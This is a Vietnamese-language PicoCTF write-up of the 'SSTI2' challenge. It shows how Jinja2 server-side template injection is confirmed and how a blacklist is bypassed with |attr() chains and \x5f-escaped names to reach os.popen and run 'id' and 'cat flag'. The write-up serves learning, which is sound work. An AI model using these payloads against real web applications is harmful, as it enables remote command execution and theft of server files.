# SSTI2

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image288.png?raw=true)

Truy cập website:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image289.png?raw=true)

Một thử thách khác liên quan tới lỗ hổng `Server-side Template Injection`. Tôi tiếp tục thử nhập `{{7*7}}` vào field:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image290.png?raw=true)

Click `OK`:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image291.png?raw=true)

=> Website có thể dính lỗ hổng `SSTI`, cụ thể tôi biết được template mà website dùng là `Jinja2`. Tôi đã thử nhập payload như bài lab trước nhưng không hoạt động:

    {{config.__class__.__init__.__globals__[‘os’].popen(‘cat flag’).read()}}

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image292.png?raw=true)

Như vậy website đã có 1 biện pháp bảo vệ trước những payload `SSTI` đơn giản. Tôi đã thử làm phức tạp payload hơn 1 chút:

    {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

Với payload này, tôi đã:

**1. Truy cập vào builtins và __import__ một cách gián tiếp:**
- Dùng `__builtins__` và `__import__` là chiêu phổ biến để import module mới khi `globals()` không có sẵn os.

**2. Dùng encoding để bypass filter:**
- `\x5f` là ký tự `_`, nên:
    - `'\x5f\x5fglobals\x5f\x5f'` => `'__globals__'`
    - `'\x5f\x5fimport\x5f\x5f'` => `'__import__'`
- Đây là kỹ thuật `obfuscation` để bypass blacklist hoặc WAF.

**3. Dùng `filter-safe` cách truy cập attribute và gọi method:**
- Dùng `|attr('name')` để truy cập attribute an toàn, tránh bị chặn cú pháp `.`.

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image293.png?raw=true)

=> Thành công. Như vậy payload cuối cùng để tìm flag sẽ là:

    {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image294.png?raw=true)

